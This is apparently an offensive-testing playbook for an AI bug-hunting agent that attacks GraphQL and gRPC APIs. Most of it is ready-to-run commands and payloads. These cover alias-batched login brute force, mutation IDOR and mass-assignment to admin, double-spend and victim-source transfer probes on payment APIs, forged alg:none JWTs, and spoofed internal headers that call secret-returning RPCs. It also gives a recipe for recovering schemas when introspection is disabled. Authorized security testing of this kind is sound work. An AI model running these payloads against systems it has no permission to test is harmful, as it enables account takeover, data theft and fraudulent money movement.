# Moraa — GraphQL & gRPC testing

> Load on any `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`, Apollo/Hasura/graphql-transport-ws.
> GraphQL bugs are mostly **authz (field/object-level) and info-disclosure via introspection**.
> Also owns § gRPC below — the other schema-first API transport, same per-operation authz discipline.

## Automated recon first
`scripts/graphql_recon.py` automates the discover-and-map step below (endpoint discovery across
the 8-path list, `__schema` introspection with the aliased-bypass WAF-dodge, and a bounded
Clairvoyance-style field-suggestion fallback when introspection is fully disabled). Run it before
doing this by hand — it's recon/mapping only (never IDOR/mass-assignment/batching), so still work
through "The bugs" below yourself once it hands you a schema:
```bash
python3 scripts/graphql_recon.py https://T --json
```

## Discover & map
```bash
# find the endpoint
for p in graphql api/graphql v1/graphql graphql/console graphiql playground query gql; do
  curl -sk https://T/$p -H 'Content-Type: application/json' -d '{"query":"{__typename}"}' -w " $p %{http_code}\n" -o /dev/null; done
# introspection (the map)
curl -sk https://T/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query{__schema{types{name fields{name args{name} type{name}}}}}"}' | jq .
# if introspection disabled: clairvoyance / graphql-cop / "did you mean" field suggestions to brute names
graphql-cop -t https://T/graphql        # common misconfigs
clairvoyance -o schema.json https://T/graphql   # rebuild schema from error suggestions
```
> Introspection may be OFF on HTTP but **ON over WebSocket** (graphql-transport-ws) — retry there
> (`websocket.md §5`). Also mine the JS bundle: precompiled query ASTs reveal real ops (`js-analysis.md`).

## The bugs
```
- Authorization: object/field-level authz missing. node(id:"<other>") / user(id:) returning others'
  data = IDOR. Query a sensitive field (email, token, ssn) on an object you shouldn't see.
- Mutation IDOR / mass-assignment: updateUser(id:<victim>, role:ADMIN); pass fields the UI doesn't.
- Batching brute-force: send an array of ops or aliased queries to bypass rate limits (login/OTP):
    {"query":"{a:login(u:\"x\",p:\"1\"){t} b:login(u:\"x\",p:\"2\"){t}}"}   (100s of aliases)
- Alias overload (distinct from batching): thousands of aliases on the SAME resolver in ONE
  request — `{a1:secret a2:secret ... a1000:secret}` — if the server doesn't cap alias count you
  get N× resolver cost in one HTTP request. Brute credentials at line speed (each alias = a fresh
  `login(...)` attempt bypassing per-request rate limits) or trigger DoS on an expensive resolver.
- Introspection info-leak: hidden admin/internal mutations & deprecated fields.
- **Aliased-introspection bypass**: when a WAF/middleware blocks the literal `__schema` keyword,
  wrap it in an alias — `query { my_alias: __schema { types { name } } }` — or dump types
  one-at-a-time via `__type(name: "User")` instead of the full `__schema` query.
- DoS: deeply nested/circular query (aliases, fragments) → resource exhaustion (note, don't weaponize).
- Injection: SQLi/NoSQLi in filter/where args (see sqli.md graphql section).
- CSRF: if it accepts application/x-www-form-urlencoded or GET query → CSRF-able mutations.
- Apollo CSRF-prevention bypass: some servers require a preflight header — try without / with text/plain.
```

## Fintech / money-movement GraphQL (ledger sits behind the resolver)
A resolver bug in a normal API leaks data; the same bug in front of a ledger/wallet/payments
backend moves money. Distinct hunting surface once the schema has `balance`/`transferFunds`/
`redeem`/`ledgerEntry`/`kycStatus`/`Money` scalar fields.
```
- Idempotency-key replay: same idempotencyKey twice → two distinct transactionIds = not enforced
  server-side, replay = double-execute.
- Decimal/precision probes on every amount arg: "0.001" (truncate-vs-round), "9999999999999999.99"
  (overflow), "1e2" (sci-notation → scalar falls back to native float?), "-50.00" (server trusts
  client-supplied sign?).
- Asymmetric source-account IDOR: transferFunds(sourceAccountId:"VICTIM", destAccountId:"ATTACKER")
  run as attacker's own session — devs check the credited destination belongs-to-caller (dangerous
  direction, gets reviewed) but forget the SAME check on the debited source (looks safe).
- Nested field-level PII: query transaction(id:"txn_123"){ counterparty{ ssnLast4 routingNumber } }
  as a user unrelated to that counterparty — top-level authz often doesn't cascade to nested types.
- Mass-assignment on admin-shaped input: updateTransaction(input:{id,status:"COMPLETED",amount:"0.01"})
  as a non-admin — client UI never sends these fields, resolver may still accept them.
- Alias-batched double-spend probe: r1:redeemRewards(...) r2:redeemRewards(...) r3:redeemRewards(...)
  same reward/account in one request — >1 success = writes aren't serialized per-resource, escalate
  to parallel-HTTP for a deterministic double-spend (`race-condition.md`).
```
**Gate 0 for money findings** (stricter than a normal GraphQL IDOR): query balance before/after —
a state change is the proof, not a 200. Race/double-spend claims must reproduce twice from clean
state. "Mutation rejected malformed input with an error" is not impact.

## Practical probes
```bash
# alias-batching login brute (single request)
curl -sk https://T/graphql -H 'Content-Type: application/json' -d @batch.json
# GET-based mutation (CSRF check)
curl -sk "https://T/graphql?query=mutation{deleteAccount(id:1)}"
# field-level IDOR (two accounts): run A's query with B's token, swap the id
```
Tools: `InQL` (Burp), `graphw00f` (engine fingerprint → engine-specific bugs), `graphql-cop`.

## Masked-error count+message oracle — recover input schemas with introspection OFF

Proven on `shop.svc.acme.example` (2026-09-24), where introspection was disabled **and** every error was
masked to `INTERNAL_SERVER_ERROR`. That combination looks sealed and gets the surface written off —
it isn't. Two leaks survive masking:

1. **One error per invalid input field.** Send an input object stuffed with guessed field names and
   *count* the errors. Drop a name, count falls by one → that name is real. This walks out the whole
   `SomeInput` shape a field at a time.
2. **A valid field falls through to the resolver, and resolver errors are usually NOT masked.**
   `NOT_FOUND`, `FORBIDDEN`, `INPUT_VALIDATION_ERROR`, `CONFLICT`, `LOCKED_ENTITY` come back
   distinguishable. **Diff the message, not just the count**, against a baseline.

That recovered `CreateOrderInput`, `MarkOrderSubmittedInput`, `ClearOrderPayByInvoiceInput` and
`UpdateOrderDetailsInput` on a target with introspection off.

> **Step 2 doubles as the authz test.** Fire one sensitive mutation per identity (anonymous / A / B)
> at one id. Identical resolver-stage errors across all three = no auth check runs before the lookup.
> A lone `200` among `FORBIDDEN` siblings = a missing gate — that is exactly how
> `clearOrderPayByInvoice` was caught (every sibling order mutation returned
> `FORBIDDEN "Access denied to order"`; that one returned success to an anonymous caller).

### 2026-09-26 refinements (re-validated on the same host, masking since tightened)

- **`data`-key oracle — reach for this first.** No `data` key = the request died in **validation**
  (unknown field, bad scalar, missing required arg). `data` present (even `data:null`) = it validated
  and a **resolver ran**. That one bit tells you whether you're debugging your own query or looking
  at real backend behaviour.
- **Neutralise the selection set with `__typename` before blaming the input.** Probing
  `storefrontOrder` with a guessed `{id status}` made *every* input shape look rejected; re-running
  with `{__typename}` revealed the correct input immediately. Vary one thing at a time.
- **The error-count oracle above needs calibration — it is not universal.** It walked out one input
  type here but returned a flat `1` for every probe on `StorefrontOrdersInput` and
  `UploadProtectedAssetInput`. If single-field probes don't move the count, abandon it rather than
  read noise.
- **Denial-string bucketing is the strongest authz oracle.** Masking is applied to *internal* errors;
  deliberate denials often pass through intact. Gated resolvers here returned
  `"Must be logged in to access resource" / FORBIDDEN`, while `getProtectedAssetSignedUrl` returned
  `INTERNAL_SERVER_ERROR` for the same unauthenticated call — **the root field that doesn't speak the
  standard denial string is the one that may not be running the check.** Sweep every root field
  unauthenticated and bucket by denial string; the odd one out is the lead.
- **Resolving an object ≠ disclosing it.** `storefrontOrder` resolved with *no session at all*, which
  reads as a critical IDOR until you select the sensitive fields: `email`, `shippingAddress`,
  `invoiceUrl`, `orderNumber` and payment transactions all came back `null`, identically for
  anonymous and for a foreign account. That is field-level authz working correctly. Always request
  the sensitive fields explicitly before calling it a finding.
- **Recover real input shapes from how the client builds them**, not from introspection:
  `grep -ohE "input:\{[a-zA-Z]+:[^}]{0,120}\}" *.js | sort -u` — yielded `input:{id:e,locale:n}`,
  `input:{id:…,secret:…,skipTaxCalculation:…}`, `input:{entityId:…,entityType:…,file:…}` and the
  `returnInvisibleProducts` flag, none of them guessable.
- **Flip every client-supplied boolean.** `returnInvisibleProducts:true` widened the unauthenticated
  catalog 754 → 1007. (Verdict here: *not* a finding — all 253 extra were already-public add-on SKUs
  — but that flag class is exactly where unreleased-product and soft-deleted-record leaks live.)

Full per-parameter drill: **`parameter-deep-dive.md`**.

**Companion trick — Next.js/webpack bundles where gql documents survive only as parsed AST:**
reconstruct operations and fragments from the `{kind:"Name",value:"…"}` sequences in the chunk
instead of grepping for literal query text, which isn't there. Pairs with the interceptor/base-config
caveat in `js-analysis.md` — literal-string grepping under-counts routes in both cases.

## Impact gate — the resolver ran is not the data was disclosed

The claim dies unless **a sensitive field returns foreign or anonymous DATA**. The falsifier, each
step a request you can paste:

1. **Request the sensitive fields BY NAME** (`email ssn token invoiceUrl`) — never grade from
   `__typename`, object existence, or a bare 200. `storefrontOrder` resolving to all-nulls for
   anonymous AND foreign callers is field-level authz WORKING (the shop.svc lesson above).
2. **Three-identity diff:** the same query as anonymous / account A / account B. A finding needs a
   sensitive field non-null (or a mutation succeeding) for an identity that must not have it.
   Identical nulls/denials across all three = clean negative — write the CLEAN file, move on.
3. **Introspection on alone is the always-rejected list** — schema visibility is not data access.
   The bug starts when a schema-revealed field or mutation returns foreign data.
4. **Batching / alias brute / DoS:** the server must actually PROCESS the ops — a `400 "batching
   disabled"` or an alias cap kills the claim; a rate-limit bypass needs N successful
   login/OTP attempts delivered by ONE request, not one.

## Method
Introspect (or reconstruct) → list every query/mutation → for each sensitive one, test **object/field
authz with two accounts** and **mutation mass-assignment**; try **batching** on rate-limited ops. →
`validate.md` → `findings/` with the query + the other user's data it returned.

---

## gRPC — the other schema-first API (recover the schema, then per-RPC authz)

> Sourced from elementalsouls/Claude-BugHunter `hunt-grpc`. Same attacker decision as GraphQL above:
> recover the schema (reflection = introspection's twin), then test each operation's authz
> individually. Cross-ref [[idor-access-control]] (per-RPC authz gap = same pattern as REST),
> [[jwt]] (metadata-header auth), [[ssrf]].

### Discover & fingerprint
```bash
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep "ALPN.*h2"   # gRPC needs HTTP/2
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" -H "content-type: application/grpc" -D - | grep grpc-status
```

### Enumerate via reflection (grpcurl)
```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
grpcurl -plaintext $TARGET:50051 list                          # h2c
grpcurl -insecure $TARGET:443 list                              # TLS
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
# bulk catalog + grep for the interesting services
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do grpcurl -plaintext $TARGET:50051 list "$SVC"; done \
  | tee grpc-catalog.txt | grep -iE 'admin|internal|debug|secret|impersonate|exec|delete'
```
**Reflection disabled?** Hunt `.proto`/descriptor files instead:
```bash
for P in proto api/proto swagger.json openapiv2 descriptor.pb; do curl -so /dev/null -w "%{http_code} $P\n" "https://$TARGET/$P"; done
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"'
protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
```

### Authz testing — READ THE STATUS CODE, not the byte count
```bash
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers
for ID in 1 2 3 100 1000; do grpcurl -plaintext $TARGET:50051 -d "{\"user_id\": $ID}" user.UserService/GetUser; done
```
| gRPC status | Meaning | Finding? |
|---|---|---|
| `0 OK` | executed | **YES — missing auth** |
| `16 Unauthenticated` | auth enforced | no |
| `7 PermissionDenied` | authz enforced | no |
| `12 Unimplemented` | wrong method | no |
| `3 InvalidArgument` | bad payload, method IS callable | **YES — fix payload, retry** |

### Metadata / trust-boundary spoofing
```bash
grpcurl -plaintext $TARGET:50051 -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." -d '{}' admin.AdminService/GetConfig   # alg:none, see jwt.md
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" "x-internal-request: true"; do
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets
done
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" -d '{}' admin.AdminService/GetConfig   # -bin suffix = base64-decoded
```
**Proof requirement:** send the spoofed header to the backend port directly AND through the public
proxy — only exploitable if the proxy forwards it unchanged.

### gRPC-Web / grpc-gateway / Connect (HTTP/JSON transcoding — often reachable from a browser)
```bash
curl -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'          # grpc-gateway REST
curl -s "https://$TARGET/user.UserService/GetUser" -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' -d '{"user_id":1}'
curl -s "https://$TARGET/user.UserService/GetUser" -H 'content-type: application/json' -H 'connect-protocol-version: 1' -d '{"user_id":1}'
```

### False-positive gates
1. `grpc-status: 0` = execution; 7/16 = working auth.
2. **Reflection enabled ≠ a finding** — report the SENSITIVE service you called unauth, not the reflection itself (that's Medium/Info at most).
3. Prove a state-delta (re-read the mutated object), not just a 200.
4. State the reachability chain (how does an external attacker reach this port at all — exposed directly? SSRF? proxy passthrough?).
5. HTTP/2 Rapid Reset (CVE-2023-44487) DoS testing needs explicit written authorization — fingerprint the version instead of testing by default.

### Severity
| Finding | Sev |
|---|---|
| Sensitive admin RPC callable unauth, state-delta proven | Critical |
| Proxy-forwarded metadata spoofing → cross-tenant impersonation | Critical |
| IDOR/mass-PII via enumerable RPC | High |
| Internal service externally reachable via transcoder | High |
| Reflection on, non-public catalog exposed | Medium |
| Proto/descriptor leak only, no callable sensitive method | Low |
